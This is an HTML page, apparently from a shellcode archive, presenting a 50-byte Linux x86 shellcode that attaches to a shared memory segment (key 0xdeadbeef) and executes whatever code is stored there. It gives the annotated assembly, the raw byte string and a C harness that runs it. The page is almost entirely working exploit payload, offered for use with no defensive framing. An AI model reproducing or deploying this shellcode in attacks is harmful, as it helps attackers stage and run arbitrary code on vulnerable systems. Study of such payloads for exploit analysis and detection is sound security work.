<html><head><title>Linux/x86 - shared memory exec - 50 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* sloth@nopninjas.com - http://www.nopninjas.com

   Platform: Linux x86
   Length: 50 bytes
     
   - This shellcode connects to the shared memory segment matching the key
     and executes the code at that address. 

        xorl    %edi,%edi
        xorl    %esi,%esi
        xorl    %edx,%edx
        movl    $0xdeadbeef,%ecx       * shared memory key *
        xorl    %ebx,%ebx
        movb    $23,%bl
        xorl    %eax,%eax
        movb    $117,%al
        int     $0x80

        xorl    %edi,%edi
        movl    $0xbffffffa,%esi       * pointer storage location *
        xorl    %edx,%edx
        movl    %eax,%ecx
        xorl    %ebx,%ebx
        movb    $21,%bl
        xorl    %eax,%eax
        movb    $117,%al
        int     $0x80

        movl    $0xbffffffa,%eax       * pointer storage location *
        pushl   (%eax)
        ret

*/

char shm[] = &quot;\x31\xff\x31\xf6\x31\xd2\xb9\xef\xbe\xad\xde\x31\xdb\xb3\x17\x31&quot;
             &quot;\xc0\xb0\x75\xcd\x80\x31\xff\xbe\xfa\xff\xff\xbf\x31\xd2\x89\xc1&quot;
             &quot;\x31\xdb\xb3\x15\x31\xc0\xb0\x75\xcd\x80\xb8\xfa\xff\xff\xbf\xff&quot;
             &quot;\x30\xc3&quot;;
              
int main() {
  void (*shell)() = (void *)&amp;shm;
  shell();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
